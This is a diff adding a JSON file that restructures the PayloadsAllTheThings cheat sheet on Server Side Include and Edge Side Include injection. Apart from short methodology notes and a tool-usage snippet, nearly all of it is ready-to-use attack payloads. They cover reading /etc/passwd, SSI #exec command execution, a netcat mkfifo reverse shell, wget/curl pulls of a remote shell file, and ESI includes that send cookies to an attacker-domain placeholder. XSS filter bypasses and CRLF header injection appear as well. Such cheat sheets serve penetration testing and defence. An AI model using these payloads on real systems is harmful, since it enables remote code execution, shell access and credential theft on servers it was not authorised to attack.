@@ -1,0 +1,226 @@
+{
+  "category": "Server Side Include Injection",
+  "source": "PayloadsAllTheThings/Server Side Include Injection/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What is SSI and when injection occurs",
+      "language": "text",
+      "tags": ["methodology", "ssi"],
+      "body": "Server Side Includes (SSI) are directives inside HTML pages that are evaluated by the server at the moment the page is served. They allow adding dynamic content without a full-fledged CGI.\n\nSSI Injection occurs when an attacker can push SSI directives into the application's input data. The directives can include files, execute commands, and print environment variables. If user input is not sanitized in the SSI context, it can be used to influence the server's behavior: read sensitive data or execute commands.\n\nSSI format: <!--#directive param=\"value\" -->"
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Where to look for SSI / ESI",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "• .shtml, .stm, .shtm pages - a classic sign of SSI enabled on Apache/nginx.\n• Any user input that is later rendered back into an HTML page.\n• ESI - at the level of edge caches and reverse proxies (Squid, Varnish, Fastly, Akamai). The surrogate does not distinguish real ESI tags from injected ones: if you manage to push an ESI tag into the HTTP response, the surrogate will process it as legitimate.\n• ESI often requires the header Surrogate-Control: content=\"ESI/1.0\" in the upstream response.\n• First try the markers <!--#echo ... --> and <esi:include ...>; if it rendered, escalate to file reading and RCE."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Tool - SSTImap (SSI detection and exploitation)",
+      "language": "bash",
+      "tags": ["tools", "ssi"],
+      "body": "python3 ./sstimap.py -u 'https://example.com/page?name=John' --legacy -s\npython3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e SSI\npython3 ./sstimap.py -i --legacy -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'"
+    },
+    {
+      "subcategory": "SSI directives",
+      "title": "Main SSI directives",
+      "language": "table",
+      "tags": ["ssi", "directives"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Description", "Payload"],
+          "rows": [
+            ["Print the date", "<!--#echo var=\"DATE_LOCAL\" -->"],
+            ["Print the document name", "<!--#echo var=\"DOCUMENT_NAME\" -->"],
+            ["Print all variables", "<!--#printenv -->"],
+            ["Set a variable", "<!--#set var=\"name\" value=\"Rich\" -->"],
+            ["Include a file (file)", "<!--#include file=\"/etc/passwd\" -->"],
+            ["Include a file (virtual)", "<!--#include virtual=\"/index.html\" -->"],
+            ["Execute a command", "<!--#exec cmd=\"ls\" -->"],
+            ["Reverse shell", "<!--#exec cmd=\"mkfifo /tmp/f;nc IP PORT 0</tmp/f|/bin/bash 1>/tmp/f;rm /tmp/f\" -->"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "SSI directives",
+      "title": "#echo - print environment variables (detection)",
+      "language": "text",
+      "tags": ["ssi", "echo", "detection"],
+      "body": "<!--#echo var=\"DATE_LOCAL\" -->\n<!--#echo var=\"DOCUMENT_NAME\" -->\n<!--#echo var=\"DOCUMENT_URI\" -->\n<!--#echo var=\"http_user_agent\" -->\n<!--#echo var=\"http_cookie\" -->\n<!--#echo var=\"remote_addr\" -->\n<!--#echo var=\"server_software\" -->\n<!--#echo var=\"query_string\" -->"
+    },
+    {
+      "subcategory": "SSI directives",
+      "title": "#echo - full list of variables",
+      "language": "text",
+      "tags": ["ssi", "echo", "variables"],
+      "body": "<!--#echo var=\"DATE_LOCAL\" -->\n<!--#echo var=\"DOCUMENT_NAME\" -->\n<!--#echo var=\"DOCUMENT_URI\" -->\n<!--#echo var=\"auth_type\" -->\n<!--#echo var=\"content_length\" -->\n<!--#echo var=\"content_type\" -->\n<!--#echo var=\"date_gmt\" -->\n<!--#echo var=\"date_local\" -->\n<!--#echo var=\"document_name\" -->\n<!--#echo var=\"document_root\" -->\n<!--#echo var=\"document_uri\" -->\n<!--#echo var=\"forwarded\" -->\n<!--#echo var=\"from\" -->\n<!--#echo var=\"gateway_interface\" -->\n<!--#echo var=\"http_accept\" -->\n<!--#echo var=\"http_accept_charset\" -->\n<!--#echo var=\"http_accept_encoding\" -->\n<!--#echo var=\"http_accept_language\" -->\n<!--#echo var=\"http_client_ip\" -->\n<!--#echo var=\"http_connection\" -->\n<!--#echo var=\"http_cookie\" -->\n<!--#echo var=\"http_form\" -->\n<!--#echo var=\"http_host\" -->\n<!--#echo var=\"http_referer\" -->\n<!--#echo var=\"http_ua_cpu\" -->\n<!--#echo var=\"http_ua_os\" -->\n<!--#echo var=\"http_user_agent\" -->\n<!--#echo var=\"last_modified\" -->\n<!--#echo var=\"netsite_root\" -->\n<!--#echo var=\"page_count\" -->\n<!--#echo var=\"path\" -->\n<!--#echo var=\"path_info\" -->\n<!--#echo var=\"path_info_translated\" -->\n<!--#echo var=\"path_translated\" -->\n<!--#echo var=\"query_string\" -->\n<!--#echo var=\"query_string_unescaped\" -->\n<!--#echo var=\"remote_addr\" -->\n<!--#echo var=\"remote_host\" -->\n<!--#echo var=\"remote_ident\" -->\n<!--#echo var=\"remote_port\" -->\n<!--#echo var=\"remote_user\" -->\n<!--#echo var=\"request_method\" -->\n<!--#echo var=\"request_uri\" -->\n<!--#echo var=\"script_filename\" -->\n<!--#echo var=\"script_name\" -->\n<!--#echo var=\"script_uri\" -->\n<!--#echo var=\"script_url\" -->\n<!--#echo var=\"server_addr\" -->\n<!--#echo var=\"server_admin\" -->\n<!--#echo var=\"server_name -->\n<!--#echo var=\"server_port\" -->\n<!--#echo var=\"server_protocol\" -->\n<!--#echo var=\"server_software\" -->\n<!--#echo var=\"site_htmlroot\" -->\n<!--#echo var=\"total_hits\" -->\n<!--#echo var=\"tz\" -->\n<!--#echo var=\"unique_id\" -->\n<!--#echo var=\"user_name\" -->"
+    },
+    {
+      "subcategory": "SSI directives",
+      "title": "#printenv - print all variables",
+      "language": "text",
+      "tags": ["ssi", "printenv", "detection"],
+      "body": "<!--#printenv -->"
+    },
+    {
+      "subcategory": "SSI directives",
+      "title": "#set - set a variable",
+      "language": "text",
+      "tags": ["ssi", "set"],
+      "body": "<!--#set var=\"name\" value=\"Rich\" -->"
+    },
+    {
+      "subcategory": "SSI directives",
+      "title": "#config - configure error output and time format",
+      "language": "text",
+      "tags": ["ssi", "config"],
+      "body": "<!--#config errmsg=\"File not found, informs users and password\"-->\n<!--#config timefmt=\"A %B %d %Y %r\"-->"
+    },
+    {
+      "subcategory": "SSI directives",
+      "title": "#include - include a file (LFI)",
+      "language": "text",
+      "tags": ["ssi", "include", "lfi"],
+      "body": "<!--#include file=\"/etc/passwd\" -->\n<!--#include virtual=\"/\" -->\n<!--#include virtual=\"/index.html\" -->\n<!--#include file=?UUUUUUUU...UU?-->"
+    },
+    {
+      "subcategory": "SSI directives",
+      "title": "#include - remote include (RFI/SSRF)",
+      "language": "text",
+      "tags": ["ssi", "include", "rfi", "ssrf"],
+      "body": "<!--#include virtual=\"http://sn1persecurity.com/.testing/rfi_vuln.php\" -->\n<!--#include virtual=\"https://crowdshield.com/.testing/rfi_vuln.php\" -->"
+    },
+    {
+      "subcategory": "SSI directives",
+      "title": "#flastmod / #fsize - file metadata",
+      "language": "text",
+      "tags": ["ssi", "flastmod", "fsize"],
+      "body": "<!--#flastmod virtual=\"echo.html\" -->\n<!--#fsize file=\"ssi.shtml\" -->"
+    },
+    {
+      "subcategory": "RCE",
+      "title": "#exec - command execution (Linux)",
+      "language": "text",
+      "tags": ["ssi", "exec", "rce"],
+      "body": "<!--#exec cmd=\"ls\" -->\n<!--#exec cmd=\"/bin/ls /\" -->\n<!--#exec cmd=\"cat /etc/passwd\" -->\n<!--#exec cmd=\"whoami\" -->\n<!--#exec cmd=\"whoami\"-->\n<!--#exec cmd=\"uname\" -->"
+    },
+    {
+      "subcategory": "RCE",
+      "title": "#exec - command execution (Windows)",
+      "language": "text",
+      "tags": ["ssi", "exec", "rce", "windows"],
+      "body": "<!--#exec cmd=\"dir\" -->\n<!--#exec cmd=\"ipconfig\" -->\n<!--#exec cmd=\"cd C:\\WINDOWS\\System32\">"
+    },
+    {
+      "subcategory": "RCE",
+      "title": "#exec - delay (time-based detection)",
+      "language": "text",
+      "tags": ["ssi", "exec", "time-based"],
+      "body": "<!--#exec cmd=\"sleep 5\" -->\n<!--#exec cmd=\"sleep 10\" -->\n<!--#exec cmd=\"perl -e 'print \"X\"*5000'\" -->"
+    },
+    {
+      "subcategory": "RCE",
+      "title": "#exec - pull payload (RFI/exfil)",
+      "language": "text",
+      "tags": ["ssi", "exec", "rce"],
+      "body": "<!--#exec cmd=\"wget http://website.com/dir/shell.txt\" -->\n<!--#exec cmd=\"curl http://sn1persecurity.com/.testing/rfi_vuln.php\" -->"
+    },
+    {
+      "subcategory": "RCE",
+      "title": "Reverse shell via #exec",
+      "language": "text",
+      "tags": ["ssi", "exec", "rce", "reverse-shell"],
+      "body": "<!--#exec cmd=\"mkfifo /tmp/f;nc IP PORT 0</tmp/f|/bin/bash 1>/tmp/f;rm /tmp/f\" -->"
+    },
+    {
+      "subcategory": "RCE",
+      "title": "Wrapping in <pre> (when output collapses)",
+      "language": "html",
+      "tags": ["ssi", "exec", "rce"],
+      "body": "<pre><!--#echo var=\"DATE_LOCAL\" --> </pre>\n<pre><!--#exec cmd=\"dir\" --></pre>\n<pre><!--#exec cmd=\"ls\" --></pre>\n<pre><!--#exec cmd=\"whoami\"--></pre>"
+    },
+    {
+      "subcategory": "Edge Side Include (ESI)",
+      "title": "What is ESI Injection",
+      "language": "text",
+      "tags": ["esi", "methodology"],
+      "body": "An HTTP surrogate (caching reverse proxy) does not distinguish real ESI tags from the upstream and malicious ones injected into the HTTP response. If an attacker pushes ESI tags into the response, the surrogate will process and evaluate them without question, treating them as legitimate upstream tags.\n\nSome surrogates need to be signaled to process ESI with the Surrogate-Control header:\n\nSurrogate-Control: content=\"ESI/1.0\""
+    },
+    {
+      "subcategory": "Edge Side Include (ESI)",
+      "title": "ESI - main payloads",
+      "language": "table",
+      "tags": ["esi", "injection"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Description", "Payload"],
+          "rows": [
+            ["Blind detection", "<esi:include src=http://[ATTACKER.DOMAIN.TLD]>"],
+            ["XSS", "<esi:include src=http://[ATTACKER.DOMAIN.TLD]/XSSPAYLOAD.html>"],
+            ["Cookie theft", "<esi:include src=http://[ATTACKER.DOMAIN.TLD]/?cookie_stealer.php?=$(HTTP_COOKIE)>"],
+            ["Include a file", "<esi:include src=\"supersecret.txt\">"],
+            ["Display debug info", "<esi:debug/>"],
+            ["Add a header", "<!--esi $add_header('Location','http://[ATTACKER.DOMAIN.TLD]') -->"],
+            ["Inline fragment", "<esi:inline name=\"/attack.html\" fetchable=\"yes\"><script>prompt('XSS')</script></esi:inline>"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Edge Side Include (ESI)",
+      "title": "ESI - blind detection / debug",
+      "language": "text",
+      "tags": ["esi", "detection"],
+      "body": "<esi:debug/>\n<esi:include src=http://google.com/>"
+    },
+    {
+      "subcategory": "Edge Side Include (ESI)",
+      "title": "ESI - CRLF header injection via src",
+      "language": "text",
+      "tags": ["esi", "crlf", "ssrf"],
+      "body": "<esi:include src=\"http://google.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/\"/>"
+    },
+    {
+      "subcategory": "Edge Side Include (ESI)",
+      "title": "ESI - XSLT via dca (Akamai)",
+      "language": "text",
+      "tags": ["esi", "xslt", "ssrf"],
+      "body": "<esi:include src=\"http://host/poc.xml\" dca=\"xslt\" stylesheet=\"http://google.com/poc.xsl\" />"
+    },
+    {
+      "subcategory": "Edge Side Include (ESI)",
+      "title": "ESI - XSS via esi:assign / esi:vars (filter bypass)",
+      "language": "html",
+      "tags": ["esi", "xss", "bypass"],
+      "body": "x=<esi:assign name=\"var1\" value=\"'cript'\"/><s<esi:vars name=\"$(var1)\"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name=\"$(var1)\"/>>"
+    },
+    {
+      "subcategory": "Edge Side Include (ESI)",
+      "title": "ESI support by surrogate implementation",
+      "language": "table",
+      "tags": ["esi", "reference"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Software", "Includes", "Vars", "Cookies", "Upstream headers required", "Host whitelist"],
+          "rows": [
+            ["Squid3", "Yes", "Yes", "Yes", "Yes", "No"],
+            ["Varnish Cache", "Yes", "No", "No", "Yes", "Yes"],
+            ["Fastly", "Yes", "No", "No", "No", "Yes"],
+            ["Akamai ESI Test Server (ETS)", "Yes", "Yes", "Yes", "No", "No"],
+            ["NodeJS' esi", "Yes", "Yes", "Yes", "No", "No"],
+            ["NodeJS' nodesi", "Yes", "No", "No", "No", "Optional"]
+          ]
+        }
+      }
+    }
+  ]
+}
